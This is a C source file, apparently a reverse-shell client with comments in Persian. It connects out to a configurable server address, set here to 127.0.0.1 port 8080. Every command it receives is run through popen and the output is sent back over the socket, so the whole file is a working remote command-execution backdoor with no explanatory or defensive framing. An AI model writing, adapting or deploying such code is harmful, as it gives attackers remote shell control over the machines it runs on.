#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUFFER_SIZE 4096
#define END_MARKER "##END##"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

void error(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

void execute_command(int sock, const char *command) {
  if (!command || strlen(command) == 0) {
    send(sock, "Invalid command\n", 16, 0);
    return;
  }

  FILE *fp = popen(command, "r");
  if (!fp) {
    send(sock, "Command failed\n", 15, 0);
    return;
  }

  char buffer[BUFFER_SIZE];
  size_t bytes_read;

  while ((bytes_read = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
    buffer[bytes_read] = '\0'; // اطمینان از پایان یافتن رشته
    if (send(sock, buffer, bytes_read, 0) < 0) {
      perror("send failed");
      break;
    }
  }

  pclose(fp);

  // ارسال `END_MARKER`
  send(sock, END_MARKER, strlen(END_MARKER), 0);
}

int main() {
  int sock;
  struct sockaddr_in serv_addr;
  char buffer[BUFFER_SIZE];

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    error("ERROR opening socket");

  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(SERVER_PORT);
  if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
    error("Invalid address");

  printf("[*] Connecting to %s:%d...\n", SERVER_IP, SERVER_PORT);
  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    error("ERROR connecting");

  printf("[+] Connected to server\n");

  while (1) {
    memset(buffer, 0, BUFFER_SIZE);
    ssize_t bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);

    if (bytes_received < 0)
      error("ERROR receiving command");
    if (bytes_received == 0) {
      printf("[!] Server disconnected\n");
      break;
    }

    buffer[bytes_received] = '\0';

    if (strcmp(buffer, "exit") == 0) {
      printf("[!] Received exit command\n");
      break;
    }

    printf("[+] Executing: %s\n", buffer);
    execute_command(sock, buffer);
  }

  close(sock);
  printf("[+] Connection closed\n");
  return EXIT_SUCCESS;
}
